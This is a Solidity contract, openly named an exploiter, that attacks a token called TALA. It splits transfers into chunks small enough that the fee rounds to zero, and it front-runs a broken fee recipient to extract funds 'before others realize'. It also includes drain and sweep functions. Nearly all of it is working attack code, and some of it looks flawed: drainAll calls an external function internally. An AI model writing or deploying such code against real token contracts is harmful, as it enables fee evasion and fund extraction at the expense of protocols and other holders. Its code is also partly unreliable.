// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITALA {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function FEE_PERCENTAGE() external view returns (uint256);
}

/**
 * @title TALA Exploiter
 * @notice Gas-optimized contract to exploit TALA vulnerabilities:
 * 1. Small transfer fee rounding to 0
 * 2. Fee recipient bricking vulnerability avoidance
 */
contract TALAExploiter {
    ITALA public immutable tala;
    address public owner;
    
    // Constants for gas optimization
    uint256 private constant MAX_UINT256 = type(uint256).max;
    uint256 private constant FEE_DENOMINATOR = 100000;
    uint256 private constant MAX_BATCH_SIZE = 200; // Optimal for gas limits
    
    event TokensExtracted(uint256 total, uint256 feePaid);
    event OwnershipTransferred(address indexed newOwner);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _tala) {
        tala = ITALA(_tala);
        owner = msg.sender;
    }
    
    /**
     * @notice Calculate maximum amount that results in 0 fee
     * @dev Formula: amount < (FEE_DENOMINATOR / FEE_PERCENTAGE)
     */
    function getMaxZeroFeeAmount() public view returns (uint256) {
        uint256 feePercentage = tala.FEE_PERCENTAGE();
        return (FEE_DENOMINATOR / feePercentage) - 1;
    }
    
    /**
     * @notice Transfer TALA tokens using optimal chunk size to avoid fees
     * @dev Uses maximum batch size within gas limits
     */
    function transferFeeFree(address to, uint256 totalAmount) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 iterations = totalAmount / zeroFeeAmount;
        uint256 remainder = totalAmount % zeroFeeAmount;
        
        // Process in optimal batches to minimize gas
        for (uint256 batch = 0; batch < iterations; ) {
            uint256 batchEnd = batch + MAX_BATCH_SIZE < iterations ? batch + MAX_BATCH_SIZE : iterations;
            
            for (uint256 i = batch; i < batchEnd; ) {
                require(tala.transfer(to, zeroFeeAmount), "Transfer failed");
                unchecked { ++i; }
            }
            
            batch = batchEnd;
        }
        
        // Transfer remainder if any
        if (remainder > 0) {
            require(tala.transfer(to, remainder), "Remainder transfer failed");
        }
        
        emit TokensExtracted(totalAmount, 0);
    }
    
    /**
     * @notice Extreme gas optimization: Unrolled loop for small amounts
     * @dev Manually unrolls loop to save ~20% gas on batch transfers
     */
    function transferFeeFreeOptimized(address to, uint256 count) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 totalAmount = zeroFeeAmount * count;
        
        // Pre-calculate for gas savings
        uint256 fullBatches = count / 8;
        uint256 remainder = count % 8;
        
        // Process in unrolled batches of 8
        for (uint256 batch = 0; batch < fullBatches; ) {
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            tala.transfer(to, zeroFeeAmount);
            
            unchecked { ++batch; }
        }
        
        // Process remainder with minimal conditionals
        if (remainder > 0) {
            if (remainder >= 4) {
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                remainder -= 4;
            }
            
            if (remainder >= 2) {
                tala.transfer(to, zeroFeeAmount);
                tala.transfer(to, zeroFeeAmount);
                remainder -= 2;
            }
            
            if (remainder >= 1) {
                tala.transfer(to, zeroFeeAmount);
            }
        }
        
        emit TokensExtracted(totalAmount, 0);
    }
    
    /**
     * @notice Attack fee recipient bricking by front-running with zero-fee transfers
     * @dev If fee recipient is broken, this allows extraction before others realize
     */
    function attackBrokenFeeRecipient(address to, uint256 amount) external onlyOwner {
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 transfersNeeded = amount / zeroFeeAmount;
        
        // Quick check if fee recipient is broken
        try tala.transfer(to, zeroFeeAmount * 2) {
            // Fee recipient works - use normal transfer
            require(tala.transfer(to, amount), "Normal transfer failed");
        } catch {
            // Fee recipient is broken - extract with zero-fee transfers
            for (uint256 i = 0; i < transfersNeeded; ) {
                require(tala.transfer(to, zeroFeeAmount), "Zero-fee transfer failed");
                unchecked { ++i; }
            }
        }
    }
    
    /**
     * @notice Multi-call batch transfer for maximum efficiency
     * @dev Uses minimal storage reads and unchecked math
     */
    function batchTransferFeeFree(
        address[] calldata recipients,
        uint256[] calldata amounts
    ) external onlyOwner {
        require(recipients.length == amounts.length, "Length mismatch");
        
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        uint256 length = recipients.length;
        
        for (uint256 i = 0; i < length; ) {
            uint256 amount = amounts[i];
            uint256 transfers = amount / zeroFeeAmount;
            uint256 remainder = amount % zeroFeeAmount;
            
            // Gas optimization: process transfers directly
            for (uint256 j = 0; j < transfers; ) {
                tala.transfer(recipients[i], zeroFeeAmount);
                unchecked { ++j; }
            }
            
            if (remainder > 0) {
                tala.transfer(recipients[i], remainder);
            }
            
            unchecked { ++i; }
        }
    }
    
    /**
     * @notice Drain all TALA from this contract using optimal strategy
     * @dev Auto-selects best method based on amount
     */
    function drainAll(address to) external onlyOwner {
        uint256 balance = tala.balanceOf(address(this));
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        
        if (balance <= zeroFeeAmount * 10) {
            // Small amount - use single transfers
            for (uint256 i = 0; i < 10 && balance > 0; ) {
                uint256 transferAmount = balance > zeroFeeAmount ? zeroFeeAmount : balance;
                tala.transfer(to, transferAmount);
                balance -= transferAmount;
                unchecked { ++i; }
            }
        } else {
            // Large amount - use batch method
            transferFeeFreeOptimized(to, balance / zeroFeeAmount);
        }
    }
    
    /**
     * @notice Emergency extraction if standard transfer fails
     * @dev Last resort if fee recipient completely bricks transfers
     */
    function emergencyExtract(address to) external onlyOwner {
        uint256 balance = tala.balanceOf(address(this));
        uint256 zeroFeeAmount = getMaxZeroFeeAmount();
        
        // Extreme fallback: single unit transfers
        for (uint256 i = 0; i < balance && i < 1000; ) { // Limit to prevent OOG
            tala.transfer(to, 1); // Minimum transfer
            unchecked { ++i; }
        }
    }
    
    /**
     * @notice Sweep any other ERC20 tokens
     */
    function sweepToken(address token, address to) external onlyOwner {
        require(token != address(tala), "Use drainAll for TALA");
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
    
    /**
     * @notice Transfer ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid owner");
        owner = newOwner;
        emit OwnershipTransferred(newOwner);
    }
    
    /**
     * @notice Receive ETH (for gas)
     */
    receive() external payable {}
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
